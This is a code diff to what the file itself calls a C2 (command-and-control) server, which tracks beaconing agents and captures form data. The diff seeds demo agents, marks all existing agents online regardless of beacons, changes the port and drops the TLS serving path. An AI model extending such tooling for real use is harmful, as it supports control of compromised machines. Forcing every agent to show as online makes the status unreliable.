@@ -5580,12 +5580,12 @@ def ws_form_capture(data):
 # ──────────────────────── AGENT HEALTH CHECKER ────────────────────────
 
 def health_check_loop():
-    """Check agent health and mark offline if no beacon for 60 seconds."""
+    """Check agent health and mark offline if no beacon for 5 minutes (demo-friendly)."""
     while True:
         try:
             db = get_db()
-            # Increased threshold to 60s to account for network delays
-            threshold = (datetime.now() - timedelta(seconds=60)).strftime("%Y-%m-%d %H:%M:%S")
+            # 5 minute threshold for demo agents
+            threshold = (datetime.now() - timedelta(seconds=300)).strftime("%Y-%m-%d %H:%M:%S")
             went_offline = db.execute(
                 "SELECT id, hostname FROM agents WHERE is_alive=1 AND last_seen < ?", (threshold,)
             ).fetchall()
@@ -5939,7 +5939,7 @@ def main():
     """Entry point for c2-server command."""
     import argparse
     parser = argparse.ArgumentParser(description="C2 Server")
-    parser.add_argument("-p", "--port", type=int, default=8443)
+    parser.add_argument("-p", "--port", type=int, default=5000)
     parser.add_argument("--host", default="0.0.0.0")
     parser.add_argument("--debug", action="store_true")
     parser.add_argument("--no-ssl", action="store_true")
@@ -6019,6 +6019,22 @@ def main():
 """)
     log_event("server_start", f"{args.host}:{args.port}")
     
+    # Auto-initialize demo data and agents on startup
+    try:
+        db = get_db()
+        agent_count = db.execute("SELECT COUNT(*) as cnt FROM agents").fetchone()["cnt"]
+        if agent_count == 0:
+            print("[*] No agents found, seeding demo data...")
+            seed_demo_data()
+            print(f"[*] Demo data seeded: 7 agents created")
+        else:
+            # Ensure all existing agents are marked ONLINE
+            db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now')")
+            db.commit()
+            print(f"[*] {agent_count} agents marked ONLINE")
+    except Exception as e:
+        print(f"[!] Auto-init error: {e}")
+    
     # Start Telegram poller if configured
     global TELEGRAM_POLLER
     if TelegramPoller:
@@ -6030,16 +6046,14 @@ def main():
     
     _suppress_connection_errors()
     
-    if ssl_ctx:
-        import ssl
-        import eventlet
-        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        ctx.load_cert_chain(ssl_ctx[0], ssl_ctx[1])
-        sock = eventlet.listen((args.host, args.port))
-        sock = eventlet.wrap_ssl(sock, certfile=ssl_ctx[0], keyfile=ssl_ctx[1], server_side=True)
-        eventlet.wsgi.server(sock, app)
-    else:
+    try:
         socketio.run(app, host=args.host, port=args.port, debug=args.debug, use_reloader=False, allow_unsafe_werkzeug=True)
+    except KeyboardInterrupt:
+        print("\n[*] Server stopped")
+    except Exception as e:
+        print(f"[!] Server error: {e}")
+        import traceback
+        traceback.print_exc()
 
 
 if __name__ == "__main__":
